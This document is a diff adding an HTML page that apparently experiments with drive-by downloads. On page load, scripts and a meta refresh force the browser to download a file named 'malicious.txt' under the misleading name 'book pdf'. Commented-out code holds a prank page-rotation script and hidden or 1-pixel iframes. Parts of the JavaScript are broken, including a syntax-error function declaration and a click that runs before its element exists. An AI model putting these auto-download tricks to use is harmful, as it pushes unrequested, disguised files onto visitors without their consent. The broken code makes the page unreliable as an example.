@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="refresh" content="100; url=autodownload.html">
+    <title></title>
+    <style>
+
+    </style>
+  </head>
+  <body>
+    <!--<script>
+    setTimeout(function(){
+ document.onmousemove = document.onkeypress =
+ function(){
+     document.body.style['transition'] = 'transform 3s';
+     document.body.style['transform'] = 'rotate(180deg)';
+ }
+}, 5000);</script>
+<h1>sadfasdfas</h1>
+<h2>h2</h2>
+<iframe src="https://google.com" width="1" height="1" frameborder="0"></iframe>
+<iframe id="my_iframe" style="display:none;"></iframe>-->
+<script>
+function Download('malicious.txt') {
+    document.getElementById('my_iframe').src = 'malicious.txt';
+};
+</script>
+
+<script>
+  document.getElementById('download').click();
+</script>
+<a href="malicious.txt" download='book pdf' id = 'download'>click me!</a>
+<a href="images/myw3schoolsimage.jpg" download>
+  <img src="images/myw3schoolsimage.jpg" alt="W3Schools" width="104" height="142">
+</a>
+<script>
+  var a = document.createElement('a');
+a.href = "malicious.txt";
+a.download = 'download';
+
+a.click();
+</script>
+  </body>
+</html>
